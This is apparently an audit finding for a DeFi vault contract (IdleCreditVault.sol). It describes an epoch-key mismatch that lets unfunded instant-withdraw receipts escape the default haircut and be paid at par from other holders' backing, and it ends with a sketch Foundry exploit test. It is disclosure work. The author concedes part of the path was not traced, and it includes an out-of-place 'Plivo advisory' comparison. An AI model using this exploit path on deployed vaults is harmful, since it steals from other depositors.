### Title
Instant-withdraw default claims keyed by the *current* `epochNumber` instead of the request epoch — unfunded receipts bypass the recovery haircut and are paid at par - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`requestInstantWithdraw` records a user's receipt under `instantWithdrawsRequestsByEpoch[_user][epochNumber]` and `instantWithdrawClaimsByEpoch[epochNumber]` — the epoch number *at request time*. `deposit()` increments `epochNumber` while an epoch is running (i.e., inside the stopEpoch/settlement path). `finalizeDefaultRecovery`, `defaultPendingClaimBasis`, `_defaultPrefundedInstantReserve`, and `_claimDefaultedInstantWithdrawRequest` all re-derive the claim key from the *current* `epochNumber`/`defaultRecoveryEpoch`. If an instant request is recorded in epoch N and `epochNumber` has advanced to N+1 by the time the borrower default is finalized, the recovery accounting reads `instantWithdrawClaimsByEpoch[N+1] == 0` and the per-user defaulted claim reads `instantWithdrawsRequestsByEpoch[_user][N+1] == 0`. The receipt is invisible to the default-recovery path — exactly like the Plivo advisory where the replay key used a non-canonical encoding of the request — and falls through to `claimInstantWithdrawRequest`'s funded path, which pays `instantWithdrawsRequests[_user]` at 1:1 par via `_transferFundedClaim`.

### Finding Description
In `requestInstantWithdraw` the receipt is bucketed by the epoch live at request time:

```solidity
// IdleCreditVault.sol:367-372
uint256 currentEpoch = epochNumber;
instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
pendingInstantWithdraws += _amount;
```

`deposit()` bumps the counter during a running epoch:

```solidity
// IdleCreditVault.sol:607-610
if (IIdleCDOEpochVariant(idleCDO).isEpochRunning()) {
  totEpochDeposits = 0;
  epochNumber += 1;
}
```

Default finalization then keys everything off the new `epochNumber`:

```solidity
// IdleCreditVault.sol:646-648
if (pendingInstantWithdraws != 0) {
  basis += instantWithdrawClaimsByEpoch[epochNumber]; // == 0 for stale-epoch claims
}
// :693, :696
defaultRecoveryEpoch = epochNumber;               // N+1, not N
defaultInstantWithdrawsFinalized = pendingInstantWithdraws != 0; // true
```

and the user-side defaulted claim also reads the shifted key:

```solidity
// IdleCreditVault.sol:843-847
claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultRecoveryEpoch]; // [N+1] == 0
if (claimBasis == 0) return claimBasis; // haircut path skipped entirely
```

`claimInstantWithdrawRequest` then continues unconditionally:

```solidity
// IdleCreditVault.sol:387-392
uint256 amount = instantWithdrawsRequests[_user];
_burn(_user, amount);
instantWithdrawsRequests[_user] = 0;
_transferFundedClaim(_user, amount); // paid at par from strategy balance
```

So an instant receipt that was *unfunded* (`pendingInstantWithdraws != 0`, never covered by `collectInstantWithdrawFunds`) is excluded from `defaultPendingClaimBasis`, excluded from `defaultRecoveryPrice`'s denominator, excluded from `_defaultPrefundedInstantReserve`, skipped by `_claimDefaultedInstantWithdrawRequest`, and finally redeemed at full value.

### Impact Explanation
An unprivileged tranche holder can request an instant withdrawal in epoch N, let the epoch roll over (borrower/manager sequencing bumps `epochNumber` via `deposit()`), and — once the borrower defaults and `finalizeDefaultRecovery` executes — claim the entire face value of an unfunded receipt at par. Because the claim basis was never included in `totalBasis`, the payout is not backed by the recovery reserve: `_transferFundedClaim` draws on strategy underlyings that belong to defaulted-epoch receipt holders and active LPs, converting an unbacked receipt into a direct theft and worsening the haircut for every other claimant (insolvency of the recovery reserve). Each wei of the instant request is a wei stolen.

### Likelihood Explanation
Requires only: (a) instant withdrawals enabled for the pool, (b) an attacker requesting an instant withdraw while an epoch is running, (c) `epochNumber` advancing before default finalization — which happens naturally at every stopEpoch via `deposit()` — and (d) an honest borrower default. All attacker actions are unprivileged (tranche holder requesting withdrawal and later claiming). The bug is structural: the write key (request-time `epochNumber`) and the read key (finalize-time `epochNumber`/`defaultRecoveryEpoch`) are two encodings of the same receipt, and nothing re-canonicalizes them. Caveat: I was unable to fully trace `IdleCDOEpochVariant`'s default path to confirm at which exact point `epochNumber` increments relative to `finalizeDefaultRecovery` (grep hits exist but the function bodies weren't read); the PoC below assumes the increment occurs in the stop/default settlement flow as `deposit()` indicates.

### Recommendation
Track the epoch in which each instant claim was recorded rather than re-deriving it at finalization: e.g., store a `lastInstantRequestEpoch`-style pointer (analogous to `lastWithdrawRequest` for normal receipts) or iterate/settle `instantWithdrawClaimsByEpoch` across all epochs with non-zero entries when computing `defaultPendingClaimBasis` and `_defaultPrefundedInstantReserve`, and have `_claimDefaultedInstantWithdrawRequest` clear the epoch where the receipt actually lives, not `defaultRecoveryEpoch`. Equivalently, snapshot `instantWithdrawClaimsByEpoch` into a pending bucket at stopEpoch time so the claim basis survives `epochNumber` increments.

### Proof of Concept
Foundry fork PoC (sketch; assumes standard epoch variant with instant withdrawals enabled and the normal `_handleBorrowerDefault`/`finalizeDefaultRecovery` flow):

```solidity
// test/foundry/InstantWithdrawEpochKeyMismatch.t.sol
function test_instantClaimBypassesDefaultHaircut() external {
    // Setup: pool running epoch N, instant withdrawals enabled, liquid reserve present.
    _depositWithUser(victim, 100e6);          // honest LP stays active

    // Attacker requests instant withdraw in epoch N — keyed under epoch N.
    vm.prank(attacker);
    cdoEpoch.requestInstantWithdraw(attackerTranches);
    // strategy: instantWithdrawsRequestsByEpoch[attacker][N] = X
    //           instantWithdrawClaimsByEpoch[N] = X ; pendingInstantWithdraws = X

    // Borrower funds only part (or none) of the instant queue; epoch rolls: epochNumber -> N+1
    _stopCurrentEpoch();                       // deposit() bumps epochNumber inside stopEpoch flow
    // start next epoch or remain in buffer; pendingInstantWithdraws still = X

    // Honest borrower default; manager/guardian finalize recovery.
    // finalizeDefaultRecovery reads instantWithdrawClaimsByEpoch[N+1] == 0
    //  -> claim basis EXCLUDES attacker's X; recoveryPrice computed without it.
    _defaultAndFinalize(partialRecovery);

    // _claimDefaultedInstantWithdrawRequest reads [attacker][N+1] == 0 -> returns 0.
    // Funded path then pays instantWithdrawsRequests[attacker] = X at PAR.
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    uint256 paid = underlying.balanceOf(attacker) - balPre;

    // Unfunded receipt paid 1:1 while defaulted receipts get recoveryPrice < RECOVERY_FULL.
    assertEq(paid, X);                                    // full par payout
    assertLt(recoveryReserveRemaining(), expectedReserve); // reserve drained below entitled level
    // Victim's defaulted-epoch claim is correspondingly short -> stolen funds.
}
```

Key assertion: `paid == X` (par) even though `instantWithdrawClaimsByEpoch[N]` was never funded and `defaultRecoveryPrice < RECOVERY_FULL`, demonstrating that the epoch-key mismatch lets one receipt escape the haircut and be paid from other users' backing.
